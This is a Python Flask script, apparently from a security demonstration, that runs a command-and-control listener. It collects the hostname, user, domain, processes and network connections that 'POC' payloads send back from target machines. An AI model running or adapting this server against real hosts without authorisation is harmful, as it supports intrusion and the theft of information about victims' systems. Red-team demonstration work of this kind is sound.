#!/usr/bin/env python3
"""
Demo C2 Beacon Listener
Receives enumeration data from POC3/POC4 payloads via HTTP POST.
Logs all beacons to console and to beacons.json on disk.

Usage:
    pip install flask
    python c2_server.py

The server listens on 0.0.0.0:5000 by default.
Override with environment variables:
    C2_PORT=8080 python c2_server.py
"""

import json
import os
import sys
from datetime import datetime, timezone

from flask import Flask, request, jsonify

app = Flask(__name__)

BEACONS_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "beacons.json")
C2_PORT = int(os.environ.get("C2_PORT", 5000))

# ------------------------------------------------------------------ #
#  Helpers                                                            #
# ------------------------------------------------------------------ #

def load_beacons():
    if os.path.exists(BEACONS_FILE):
        with open(BEACONS_FILE, "r") as f:
            return json.load(f)
    return []


def save_beacon(entry):
    beacons = load_beacons()
    beacons.append(entry)
    with open(BEACONS_FILE, "w") as f:
        json.dump(beacons, f, indent=2)


def log_beacon(entry):
    """Pretty-print a beacon to the terminal."""
    sep = "=" * 72
    print(f"\n{sep}")
    print(f"  NEW BEACON  |  {entry.get('received_at', '?')}")
    print(sep)
    print(f"  POC ........ {entry.get('poc', '?')}")
    print(f"  Hostname ... {entry.get('hostname', '?')}")
    print(f"  Username ... {entry.get('domain', '?')}\\{entry.get('username', '?')}")
    print(f"  IP ......... {entry.get('ip_address', '?')}")
    print(f"  OS ......... {entry.get('os_version', '?')}")
    print(f"  Source IP .. {entry.get('source_ip', '?')}")

    if entry.get("processes"):
        procs = entry["processes"]
        if isinstance(procs, str):
            lines = procs.strip().splitlines()
        else:
            lines = procs
        print(f"\n  Processes ({len(lines)} total):")
        for p in lines[:20]:
            print(f"    - {p.strip()}")
        if len(lines) > 20:
            print(f"    ... and {len(lines) - 20} more")

    if entry.get("network"):
        conns = entry["network"]
        if isinstance(conns, str):
            lines = conns.strip().splitlines()
        else:
            lines = conns
        print(f"\n  Network connections ({len(lines)} total):")
        for c in lines[:15]:
            print(f"    {c.strip()}")
        if len(lines) > 15:
            print(f"    ... and {len(lines) - 15} more")

    print(sep + "\n")
    sys.stdout.flush()


# ------------------------------------------------------------------ #
#  Routes                                                             #
# ------------------------------------------------------------------ #

@app.route("/beacon", methods=["POST"])
def receive_beacon():
    """Main endpoint -- payloads POST enumeration JSON here."""
    try:
        data = request.get_json(force=True, silent=True) or {}
    except Exception:
        data = {}

    entry = {
        "received_at": datetime.now(timezone.utc).isoformat(),
        "source_ip": request.remote_addr,
        "poc": data.get("poc", "unknown"),
        "hostname": data.get("hostname", ""),
        "username": data.get("username", ""),
        "domain": data.get("domain", ""),
        "ip_address": data.get("ip_address", ""),
        "os_version": data.get("os_version", ""),
        "processes": data.get("processes", ""),
        "network": data.get("network", ""),
        "raw": data,
    }

    save_beacon(entry)
    log_beacon(entry)

    return jsonify({"status": "ok", "id": len(load_beacons())}), 200


@app.route("/beacons", methods=["GET"])
def list_beacons():
    """Return all received beacons as JSON (for quick checks)."""
    return jsonify(load_beacons()), 200


@app.route("/beacons/latest", methods=["GET"])
def latest_beacon():
    """Return the most recent beacon."""
    beacons = load_beacons()
    if beacons:
        return jsonify(beacons[-1]), 200
    return jsonify({"error": "no beacons yet"}), 404


@app.route("/beacons/clear", methods=["DELETE"])
def clear_beacons():
    """Delete all stored beacons (reset for next demo run)."""
    if os.path.exists(BEACONS_FILE):
        os.remove(BEACONS_FILE)
    print("[*] Beacons cleared.")
    return jsonify({"status": "cleared"}), 200


@app.route("/health", methods=["GET"])
def health():
    return jsonify({"status": "listening", "beacons": len(load_beacons())}), 200


# ------------------------------------------------------------------ #
#  Main                                                               #
# ------------------------------------------------------------------ #

if __name__ == "__main__":
    print(f"""
    ============================================
      Demo C2 Beacon Listener
      Listening on 0.0.0.0:{C2_PORT}
    ============================================
      POST /beacon        - receive enum data
      GET  /beacons        - list all beacons
      GET  /beacons/latest - last beacon
      DELETE /beacons/clear - reset stored data
      GET  /health         - server status
    ============================================
    Waiting for beacons...
    """)
    app.run(host="0.0.0.0", port=C2_PORT, debug=False)
